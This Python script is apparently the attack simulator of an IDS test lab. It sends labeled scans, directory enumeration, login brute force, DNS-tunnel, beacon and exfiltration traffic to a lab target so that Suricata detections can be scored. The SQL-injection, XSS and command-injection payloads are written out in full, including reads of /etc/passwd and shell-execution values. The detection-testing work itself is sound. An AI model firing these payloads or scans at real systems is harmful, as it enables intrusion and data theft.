"""NetGuard attack-simulation driver.

Runs the labeled attack catalogue against the monitored app and writes a
manifest.json that records, for every technique, the *real* start/end wall-clock
window (epoch seconds, UTC) plus the detection matcher the scorer will use.

Nothing here is a real exploit: the nginx target is unmodified and the payloads
are detection triggers (recognizable attack *shapes*), not intrusions. The
container is profile-gated (`profiles: [attack]`) and attached only to
netguard-lab, so it can never reach the monitoring plane (invariant 2).

Run (via compose):
    docker compose --profile attack run --rm attack-sim   # MODE=catalogue

Environment:
    TARGET      base URL of the monitored app   (default http://10.10.0.20)
    TARGET_IP   its IP, stamped into the manifest for the scorer's dst filter
    SIM_IP      this container's lab IP          (default 10.10.0.40)
    SCENARIO    all | attacks | negatives | comma list of ids (A01,A04,...)
    MODE        catalogue (labeled run, default) | smoke
    RUN_ID      run directory name under /runs   (default: UTC timestamp)
"""

import ipaddress
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request

import catalogue as cat

TARGET = os.getenv("TARGET", "http://10.10.0.20").rstrip("/")
TARGET_IP = os.getenv("TARGET_IP", "10.10.0.20")
SIM_IP = os.getenv("SIM_IP", "").strip()
SCENARIO = os.getenv("SCENARIO", "all")
MODE = os.getenv("MODE", "catalogue")
RUN_ID = os.getenv("RUN_ID") or time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
RUNS_ROOT = os.getenv("RUNS_ROOT", "/runs")

UA_ATTACK = "NetGuard-AttackSim/2.1"
HTTP_TIMEOUT = 4


def log(msg: str) -> None:
    print(f"[attack-sim] {msg}", flush=True)


def detect_sim_ip() -> str:
    if SIM_IP:
        return SIM_IP
    try:
        return socket.gethostbyname(socket.gethostname())
    except OSError:
        return ""


def raw_http(path: str):
    """Send a GET whose request-target carries a raw attack payload.

    urllib rejects spaces/control chars in a URL, so injection payloads
    (SQLi/XSS/cmd-injection) can't go through http(). A raw socket puts the
    payload on the wire verbatim — spaces percent-encoded, attack characters
    (quotes, <>, |, ;) left literal — which is exactly what a scanner emits and
    what ET's http.uri rules inspect. Best-effort; never raises.
    """
    target = path if path.startswith("/") else "/" + path
    target = target.replace(" ", "%20")
    req = (
        f"GET {target} HTTP/1.1\r\n"
        f"Host: {TARGET_IP}\r\n"
        f"User-Agent: {UA_ATTACK}\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n\r\n"
    )
    try:
        with socket.create_connection((TARGET_IP, 80), timeout=HTTP_TIMEOUT) as sock:
            sock.sendall(req.encode("latin-1", "replace"))
            sock.recv(1024)
    except OSError:
        pass


def http(method: str, path: str, *, body: bytes = None, headers: dict = None):
    """Best-effort HTTP request; never raises, returns status int or None."""
    url = TARGET + "/" + path.lstrip("/")
    hdrs = {"User-Agent": UA_ATTACK}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            resp.read(2048)  # drain a little; ignore rest
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code
    except OSError:
        return None


# ── Technique implementations. Each returns nothing; the runner times them. ──

def safe_target(value: str) -> str:
    """Reject a TARGET_IP that could smuggle extra nmap argv (argument injection).

    The subprocess call is list-form (no shell), so this is defense in depth: it
    guarantees the target is an IP or a plain hostname and never begins with '-'.
    """
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        pass
    if re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9.-]{0,252}", value):
        return value
    raise SystemExit(f"[attack-sim] refusing unsafe TARGET_IP: {value!r}")


def tech_nmap(args):
    """A01/A02: SYN or version scan. Falls back to -sT if raw sockets denied."""
    if not shutil.which("nmap"):
        log("nmap not installed; skipping scan payload (window still recorded)")
        return
    cmd = ["nmap", *args, "-p", "1-1024,3000,8080,9090", "-Pn", safe_target(TARGET_IP)]
    try:
        # list-form subprocess (no shell); target validated by safe_target()
        subprocess.run(cmd, timeout=90, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)  # nosemgrep
    except (subprocess.SubprocessError, OSError) as exc:
        # -sS needs CAP_NET_RAW; fall back to a TCP connect scan if it bombed.
        if "-sS" in args:
            log(f"nmap -sS failed ({exc}); retrying -sT connect scan")
            tech_nmap(["-sT"])


def tech_dir_enum(_):
    """A03: directory / vhost enumeration against common paths."""
    paths = [
        "admin", "administrator", "login", "wp-admin", "phpmyadmin", ".git/config",
        "backup.zip", "config.php", "server-status", "actuator/env", ".env",
        "api/v1/users", "cgi-bin/test.cgi", "shell.php", "console",
    ]
    for p in paths:
        http("GET", p, headers={"User-Agent": "gobuster/3.6"})


def tech_sqli(_):
    """A04: SQL-injection query strings."""
    payloads = [
        "id=1' OR '1'='1",
        "id=1 UNION SELECT username,password FROM users--",
        "id=1; DROP TABLE users--",
        "user=admin'--",
        "q=1%27%20OR%201=1--",
    ]
    for pl in payloads:
        raw_http(f"/search?{pl}")


def tech_xss(_):
    """A05: reflected-XSS query strings."""
    payloads = [
        "q=<script>alert(1)</script>",
        "name=<img src=x onerror=alert(1)>",
        "s=javascript:alert(document.cookie)",
        "q=%3Cscript%3Ealert(1)%3C/script%3E",
    ]
    for pl in payloads:
        raw_http(f"/search?{pl}")


def tech_cmdi(_):
    """A06: command-injection query strings."""
    payloads = [
        "host=127.0.0.1;cat /etc/passwd",
        "ping=8.8.8.8|id",
        "cmd=`whoami`",
        "file=$(/bin/sh -c id)",
    ]
    for pl in payloads:
        raw_http(f"/ping?{pl}")


def tech_brute(_):
    """A07: rapid HTTP basic-auth / login brute force."""
    for i in range(40):
        http(
            "POST",
            "login",
            body=f"username=admin&password=guess{i}".encode(),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": "Basic YWRtaW46d3Jvbmc=",
            },
        )


def tech_dns_tunnel(_):
    """A08: DNS tunneling — long-label lookups under a controlled base domain."""
    import base64
    base = os.getenv("DNS_TUNNEL_BASE", "tunnel.netguard-lab.example")
    for i in range(30):
        chunk = base64.b32encode(os.urandom(20)).decode().strip("=").lower()
        host = f"{chunk}.{i}.{base}"
        try:
            socket.getaddrinfo(host, 80)
        except OSError:
            pass  # NXDOMAIN expected; the query on the wire is the payload


def tech_beacon(_):
    """A09: periodic C2-style check-in at a fixed cadence."""
    for _ in range(20):
        http("GET", "beacon", headers={"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0)"})
        time.sleep(1.0)


def tech_exfil(_):
    """A10: suspicious outbound volume — a large POST body."""
    blob = os.urandom(2 * 1024 * 1024)  # 2 MiB
    http("POST", "upload", body=blob, headers={"Content-Type": "application/octet-stream"})


# ── Negative controls: benign traffic that resembles an attack. ──────────────

def neg_admin_login(_):
    """N01: a single, well-formed admin login (not a brute force)."""
    http(
        "POST",
        "login",
        body=b"username=admin&password=correct-horse-battery-staple",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
    )


def neg_large_download(_):
    """N02: one large but legitimate GET (not exfil)."""
    http("GET", "", headers={"User-Agent": "Mozilla/5.0", "Range": "bytes=0-2097152"})


def neg_api_poll(_):
    """N03: rapid but normal API polling of a single endpoint (not a scan)."""
    for _ in range(20):
        http("GET", "api/status", headers={"User-Agent": "netguard-dashboard/1.0"})
        time.sleep(0.2)


def neg_dns_many_hosts(_):
    """N04: DNS lookups for many distinct *real* short-label hosts (not tunneling)."""
    hosts = [
        "example.com", "example.org", "example.net", "iana.org", "root-servers.net",
        "localhost", "monitored-app", "netguard-monitor", "grafana", "prometheus",
    ]
    for h in hosts:
        try:
            socket.getaddrinfo(h, 80)
        except OSError:
            pass


RUNNERS = {
    "A01": (tech_nmap, ["-sS"]),
    "A02": (tech_nmap, ["-sV"]),
    "A03": (tech_dir_enum, None),
    "A04": (tech_sqli, None),
    "A05": (tech_xss, None),
    "A06": (tech_cmdi, None),
    "A07": (tech_brute, None),
    "A08": (tech_dns_tunnel, None),
    "A09": (tech_beacon, None),
    "A10": (tech_exfil, None),
    "N01": (neg_admin_login, None),
    "N02": (neg_large_download, None),
    "N03": (neg_api_poll, None),
    "N04": (neg_dns_many_hosts, None),
}


def main() -> int:
    sim_ip = detect_sim_ip()
    entries = cat.select(SCENARIO)
    if not entries:
        log(f"SCENARIO='{SCENARIO}' selected no techniques; nothing to do")
        return 2

    out_dir = os.path.join(RUNS_ROOT, RUN_ID)
    os.makedirs(out_dir, exist_ok=True)

    log(f"run_id={RUN_ID} target={TARGET} target_ip={TARGET_IP} sim_ip={sim_ip or '?'}")
    log(f"mode={MODE} scenario={SCENARIO} -> {len(entries)} techniques")

    manifest_entries = []
    for spec in entries:
        runner, args = RUNNERS.get(spec["id"], (None, None))
        record = {
            "id": spec["id"],
            "name": spec["name"],
            "attack_id": spec["attack_id"],
            "tool": spec["tool"],
            "kind": spec["kind"],
            "expected": spec["expected"],
            "dest_ip": TARGET_IP if spec["id"] not in ("A08", "N04") else None,
            "status": "ran",
            "error": None,
        }
        start = time.time()
        try:
            if runner is None:
                record["status"] = "skipped"
                record["error"] = "no runner"
            else:
                log(f"{spec['id']} {spec['name']} …")
                runner(args)
        except Exception as exc:  # noqa: BLE001 — never abort the whole run
            record["status"] = "error"
            record["error"] = f"{type(exc).__name__}: {exc}"
            log(f"{spec['id']} errored: {record['error']}")
        end = time.time()
        record["start_epoch"] = round(start, 3)
        record["end_epoch"] = round(end, 3)
        record["start_iso"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(start))
        manifest_entries.append(record)
        # small gap so adjacent windows don't smear into one another
        time.sleep(1.0)

    manifest = {
        "schema": "netguard-manifest/1",
        "meta": {
            "run_id": RUN_ID,
            "mode": MODE,
            "scenario": SCENARIO,
            "generated_at_epoch": round(time.time(), 3),
            "generated_at_iso": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "sim_ip": sim_ip,
            "target": TARGET,
            "target_ip": TARGET_IP,
            "demo_sids": cat.DEMO_SIDS,
            # Stamped by the scorer wrapper (it knows the pinned versions);
            # left null here so the driver stays decoupled from the host tools.
            "ruleset_version": os.getenv("RULESET_VERSION"),
            "suricata_version": os.getenv("SURICATA_VERSION"),
        },
        "entries": manifest_entries,
    }

    manifest_path = os.path.join(out_dir, "manifest.json")
    with open(manifest_path, "w", encoding="utf-8") as fh:
        json.dump(manifest, fh, indent=2)
    log(f"wrote {manifest_path} ({len(manifest_entries)} entries)")
    log("next: scorer joins this manifest against Suricata eve.json")
    return 0


if __name__ == "__main__":
    sys.exit(main())
